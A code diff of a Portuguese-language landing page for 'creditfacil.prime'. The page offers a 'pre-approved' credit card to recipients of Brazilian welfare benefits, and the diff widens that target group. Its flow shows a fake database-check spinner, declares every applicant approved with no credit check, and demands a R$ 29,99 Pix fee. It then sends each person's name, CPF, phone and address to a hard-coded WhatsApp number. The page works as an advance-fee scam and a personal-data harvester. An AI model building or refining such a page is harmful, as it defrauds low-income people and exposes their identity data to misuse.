@@ -31,12 +31,6 @@
       background-color: #00d2ff;
       color: #051329;
     }
-    /* Estilo do Cartão Elegante */
-    .credit-card-preview {
-      background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
-      border: 1px solid rgba(0, 210, 255, 0.3);
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-    }
   </style>
 </head>
 <body class="min-h-screen flex flex-col justify-between">
@@ -46,7 +40,7 @@
     <div class="max-w-xl mx-auto flex items-center justify-between">
       <div class="flex items-center gap-2">
         <div class="w-8 h-8 rounded-lg bg-[#00d2ff]/20 border border-[#00d2ff]/40 flex items-center justify-center">
-          <i class="fa-solid fa-building-columns text-[#00d2ff] text-sm"></i>
+          <i class="fa-solid fa-credit-card text-[#00d2ff] text-sm"></i>
         </div>
         <span class="text-lg font-black tracking-wider text-white">
           creditfacil.<span class="text-[#00d2ff]">prime</span>
@@ -62,7 +56,7 @@
   <div class="bg-gradient-to-r from-[#030b1b] via-[#0b1d3a] to-[#030b1b] border-b border-[#1e3a6e] py-2.5 px-4 text-center">
     <p class="text-xs font-semibold text-gray-200">
       <i class="fa-solid fa-circle-info text-[#00d2ff] mr-1.5"></i>
-      Cartão Consignado & Benefício exclusivo para <span class="text-[#00d2ff] font-bold">LOAS, BPC e Bolsa Família</span>.
+      Cartão de Crédito Pré-Aprovado exclusivo para <span class="text-[#00d2ff] font-bold">todos os Beneficiários de Auxílios do Governo</span>.
     </p>
   </div>
 
@@ -93,7 +87,7 @@
       <div id="step-1-content">
         <div class="mb-6">
           <h2 class="text-xl font-black text-white tracking-tight">Simule o seu Limite Pré-Aprovado</h2>
-          <p class="text-xs text-gray-300 mt-1">Preencha seus dados para consulta e envio do cartão físico.</p>
+          <p class="text-xs text-gray-300 mt-1">Preencha seus dados para consulta imediata e envio do seu cartão físico.</p>
         </div>
 
         <form id="form-step-1" class="space-y-3.5" onsubmit="handleNextStep(event)">
@@ -119,8 +113,10 @@
               <option value="" disabled selected>Selecione seu benefício...</option>
               <option value="Bolsa Família">Bolsa Família / Auxílio Brasil</option>
               <option value="BPC / LOAS">BPC / LOAS (Idoso ou Deficiência)</option>
-              <option value="Auxílio Gás">Auxílio Gás / Outros Benefícios</option>
+              <option value="Auxílio Gás">Auxílio Gás</option>
+              <option value="Pé-de-Meia">Pé-de-Meia</option>
               <option value="Aposentado/Pensionista">Aposentado ou Pensionista INSS</option>
+              <option value="Outros Auxílios">Outros Auxílios Governamentais</option>
             </select>
           </div>
 
@@ -152,11 +148,11 @@
         <div class="w-16 h-16 border-4 border-[#00d2ff]/30 border-t-[#00d2ff] rounded-full animate-spin mx-auto"></div>
         <div>
           <h3 class="text-lg font-bold text-white">Consultando Base de Dados...</h3>
-          <p class="text-xs text-gray-300 mt-1">Validando margem do benefício e elegibilidade para o cartão físico.</p>
+          <p class="text-xs text-gray-300 mt-1">Validando elegibilidade para liberação do Cartão de Crédito Pré-Aprovado.</p>
         </div>
       </div>
 
-      <!-- ETAPA 3: APROVADO + PRÉVIA DO CARTÃO + PIX -->
+      <!-- ETAPA 3: APROVADO + IMAGEM DO CARTÃO + PIX -->
       <div id="step-3-content" class="hidden space-y-5">
         <div class="bg-[#00d2ff]/10 border border-[#00d2ff]/30 rounded-2xl p-4 text-center">
           <span class="text-[10px] font-bold text-[#00d2ff] uppercase tracking-widest bg-[#00d2ff]/20 px-3 py-1 rounded-full inline-block mb-2">● Crédito Aprovado com Sucesso</span>
@@ -165,30 +161,12 @@
           <p class="text-[11px] text-[#00d2ff]">Cartão Físico Personalizado com Entrega em até 15 Dias Úteis</p>
         </div>
 
-        <!-- PRÉVIA DO CARTÃO FÍSICO CHIC -->
-        <div class="credit-card-preview rounded-2xl p-5 text-white relative overflow-hidden">
-          <div class="absolute -right-8 -bottom-8 w-32 h-32 bg-[#00d2ff]/10 rounded-full blur-xl"></div>
-          <div class="flex justify-between items-start mb-6">
-            <div>
-              <span class="text-[10px] tracking-widest uppercase text-gray-400">Cartão Black Benefício</span>
-              <h4 class="text-base font-black tracking-wider">creditfacil.<span class="text-[#00d2ff]">prime</span></h4>
-            </div>
-            <i class="fa-solid fa-sim-card text-yellow-400 text-2xl"></i>
-          </div>
-          <div class="space-y-3">
-            <div class="flex items-center gap-2 text-xs tracking-widest font-mono text-gray-300">
-              <span>••••</span><span>••••</span><span>••••</span><span>8842</span>
-            </div>
-            <div class="flex justify-between items-end text-xs">
-              <div>
-                <span class="text-[9px] uppercase text-gray-400 block">Titular</span>
-                <span id="card-holder-name" class="font-bold uppercase tracking-wide truncate max-w-[180px] block">BENEFICIÁRIO APROVADO</span>
-              </div>
-              <div class="text-right">
-                <span class="text-[9px] uppercase text-gray-400 block">Validade</span>
-                <span class="font-bold">12/31</span>
-              </div>
-            </div>
+        <!-- FOTO ILUSTRATIVA DO CARTÃO ENVIADO -->
+        <div class="rounded-2xl overflow-hidden border border-[#00d2ff]/40 shadow-xl bg-[#030b1b]">
+          <img src="WhatsApp Image 2026-10-30 at 16.14.09.jpeg" alt="Cartão de Crédito Creditfácil Prime" class="w-full h-auto object-cover" />
+          <div class="p-3 text-center bg-[#030b1b]/90 border-t border-[#1e3a6e]">
+            <span class="text-[10px] text-gray-400 uppercase tracking-widest block">Titular Aprovado:</span>
+            <span id="card-holder-name" class="text-sm font-bold text-[#00d2ff] uppercase">BENEFICIÁRIO APROVADO</span>
           </div>
         </div>
 
@@ -196,6 +174,10 @@
           <div class="flex items-start gap-2.5">
             <i class="fa-solid fa-check text-[#00d2ff] mt-0.5"></i>
             <span>Sem consulta ao SPC / Serasa e sem burocracia.</span>
+          </div>
+          <div class="flex items-start gap-2.5">
+            <i class="fa-solid fa-check text-[#00d2ff] mt-0.5"></i>
+            <span>Aprovado para beneficiários de auxílios governamentais.</span>
           </div>
           <div class="flex items-start gap-2.5">
             <i class="fa-solid fa-check text-[#00d2ff] mt-0.5"></i>
@@ -210,7 +192,7 @@
             <p class="text-[11px] text-gray-400 mt-0.5">Taxa única de emissão e postagem: <strong class="text-white">R$ 29,99</strong></p>
           </div>
 
-          <!-- QR Code Ilustrativo / Espaço Dedicado -->
+          <!-- QR Code Ilustrativo -->
           <div class="bg-white p-3 rounded-xl w-36 h-36 mx-auto flex items-center justify-center border-4 border-[#00d2ff]/20">
             <div class="w-full h-full bg-gray-900 rounded-lg flex flex-col items-center justify-center text-white p-2 text-center">
               <i class="fa-solid fa-qrcode text-4xl text-[#00d2ff] mb-1"></i>
@@ -287,7 +269,7 @@
       const uf = document.getElementById('input-uf').value;
       const endereco = document.getElementById('input-endereco').value;
 
-      const texto = `Olá! Realizei o pagamento da taxa de R$ 29,99 e quero emitir meu cartão no creditfacil.prime.%0A%0A*Dados do Cliente:*%0A- Nome: ${nome}%0A- CPF: ${cpf}%0A- WhatsApp: ${tel}%0A- Benefício: ${beneficio}%0A%0A*Endereço de Entrega (Prazo: 15 dias úteis):*%0A- Endereço: ${endereco}%0A- CEP: ${cep} - UF: ${uf}%0A%0AEstou a enviar o comprovante em anexo!`;
+      const texto = `Olá! Realizei o pagamento da taxa de R$ 29,99 e quero emitir meu Cartão de Crédito Pré-Aprovado no creditfacil.prime.%0A%0A*Dados do Cliente:*%0A- Nome: ${nome}%0A- CPF: ${cpf}%0A- WhatsApp: ${tel}%0A- Benefício: ${beneficio}%0A%0A*Endereço de Entrega (Prazo: 15 dias úteis):*%0A- Endereço: ${endereco}%0A- CEP: ${cep} - UF: ${uf}%0A%0AEstou enviando o comprovante em anexo!`;
       
       const numeroWhatsApp = "5511958370146";
       window.open(`https://api.whatsapp.com/send?phone=${numeroWhatsApp}&text=${texto}`, '_blank');
